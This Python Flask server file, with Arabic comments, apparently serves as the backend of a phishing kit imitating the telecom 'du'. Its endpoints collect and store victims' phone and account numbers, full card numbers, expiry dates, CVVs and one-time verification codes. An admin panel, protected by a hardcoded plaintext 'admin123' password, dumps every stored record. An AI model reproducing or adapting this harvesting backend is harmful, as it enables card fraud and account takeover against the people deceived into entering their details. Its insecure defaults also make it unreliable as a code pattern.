from flask import Flask, request, jsonify, session
import sqlite3
import os
import secrets

app = Flask(__name__, static_folder='.', static_url_path='')
app.secret_key = secrets.token_hex(16)

# إنشاء قاعدة البيانات إذا لم تكن موجودة
def init_db():
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    # إنشاء جدول للهواتف
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS phones (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone_number TEXT,
        account_number TEXT,
        amount REAL,
        payment_method TEXT,
        transaction_number TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # إنشاء جدول لبيانات البطاقات
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_holder TEXT,
        card_number TEXT,
        expiry_date TEXT,
        cvv TEXT,
        transaction_number TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # إنشاء جدول لرموز التحقق
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS verification_codes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        verification_code TEXT,
        transaction_number TEXT,
        verification_type TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # إنشاء جدول للأرقام الأساسية
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS base_numbers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        base_number TEXT,
        accept_request BOOLEAN,
        share_info BOOLEAN,
        transaction_number TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # إنشاء جدول للمستخدمين الإداريين
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # إضافة مستخدم إداري افتراضي إذا لم يكن موجوداً
    cursor.execute('SELECT COUNT(*) FROM admin_users')
    if cursor.fetchone()[0] == 0:
        cursor.execute('INSERT INTO admin_users (username, password) VALUES (?, ?)', ('admin', 'admin123'))
    
    conn.commit()
    conn.close()

# تهيئة قاعدة البيانات عند بدء التطبيق
init_db()

# الصفحة الرئيسية
@app.route('/')
def index():
    return app.send_static_file('index.html')

# واجهة برمجية لحفظ بيانات الهاتف
@app.route('/api/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO phones (phone_number, account_number, amount, payment_method, transaction_number)
    VALUES (?, ?, ?, ?, ?)
    ''', (
        data.get('phone_number', ''),
        data.get('account_number', ''),
        data.get('amount', 0),
        data.get('payment_method', ''),
        data.get('transaction_number', '')
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success", "message": "تم حفظ بيانات الهاتف بنجاح"})

# واجهة برمجية لحفظ بيانات البطاقة
@app.route('/api/save-card', methods=['POST'])
def save_card():
    data = request.json
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO cards (card_holder, card_number, expiry_date, cvv, transaction_number)
    VALUES (?, ?, ?, ?, ?)
    ''', (
        data.get('card_holder', ''),
        data.get('card_number', ''),
        data.get('expiry_date', ''),
        data.get('cvv', ''),
        data.get('transaction_number', '')
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success", "message": "تم حفظ بيانات البطاقة بنجاح"})

# واجهة برمجية لحفظ رمز التحقق
@app.route('/api/save-verification', methods=['POST'])
def save_verification():
    data = request.json
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO verification_codes (verification_code, transaction_number, verification_type)
    VALUES (?, ?, ?)
    ''', (
        data.get('verification_code', ''),
        data.get('transaction_number', ''),
        data.get('verification_type', '')
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success", "message": "تم حفظ رمز التحقق بنجاح"})

# واجهة برمجية لحفظ الرقم الأساسي
@app.route('/api/save-base-number', methods=['POST'])
def save_base_number():
    data = request.json
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO base_numbers (base_number, accept_request, share_info, transaction_number)
    VALUES (?, ?, ?, ?)
    ''', (
        data.get('base_number', ''),
        data.get('accept_request', False),
        data.get('share_info', False),
        data.get('transaction_number', '')
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success", "message": "تم حفظ الرقم الأساسي بنجاح"})

# التحقق من حالة تسجيل الدخول
def check_login():
    return session.get('admin_logged_in', False)

# واجهة برمجية لعرض جميع البيانات المخزنة
@app.route('/api/get-all-data', methods=['GET'])
def get_all_data():
    # التحقق من تسجيل الدخول
    if not check_login():
        return jsonify({"status": "error", "message": "غير مصرح بالوصول"}), 401
    
    conn = sqlite3.connect('du_database.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # استرجاع بيانات الهواتف
    cursor.execute('SELECT * FROM phones')
    phones = [dict(row) for row in cursor.fetchall()]
    
    # استرجاع بيانات البطاقات
    cursor.execute('SELECT * FROM cards')
    cards = [dict(row) for row in cursor.fetchall()]
    
    # استرجاع رموز التحقق
    cursor.execute('SELECT * FROM verification_codes')
    verification_codes = [dict(row) for row in cursor.fetchall()]
    
    # استرجاع الأرقام الأساسية
    cursor.execute('SELECT * FROM base_numbers')
    base_numbers = [dict(row) for row in cursor.fetchall()]
    
    conn.close()
    
    return jsonify({
        "phones": phones,
        "cards": cards,
        "verification_codes": verification_codes,
        "base_numbers": base_numbers
    })

# واجهة برمجية لتسجيل دخول المستخدم الإداري
@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    
    conn = sqlite3.connect('du_database.db')
    cursor = conn.cursor()
    
    # التحقق من اسم المستخدم وكلمة المرور
    cursor.execute('SELECT * FROM admin_users WHERE username = ? AND password = ?', (username, password))
    user = cursor.fetchone()
    
    conn.close()
    
    if user:
        # تعيين حالة تسجيل الدخول في الجلسة
        session['admin_logged_in'] = True
        session['admin_username'] = username
        return jsonify({"status": "success", "message": "تم تسجيل الدخول بنجاح"})
    else:
        return jsonify({"status": "error", "message": "اسم المستخدم أو كلمة المرور غير صحيحة"})

# واجهة برمجية للتحقق من حالة تسجيل الدخول
@app.route('/api/admin/check-auth', methods=['GET'])
def check_auth():
    if session.get('admin_logged_in'):
        return jsonify({"status": "success", "logged_in": True, "username": session.get('admin_username')})
    else:
        return jsonify({"status": "error", "logged_in": False})

# واجهة برمجية لتسجيل الخروج
@app.route('/api/admin/logout', methods=['POST'])
def admin_logout():
    session.pop('admin_logged_in', None)
    session.pop('admin_username', None)
    return jsonify({"status": "success", "message": "تم تسجيل الخروج بنجاح"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
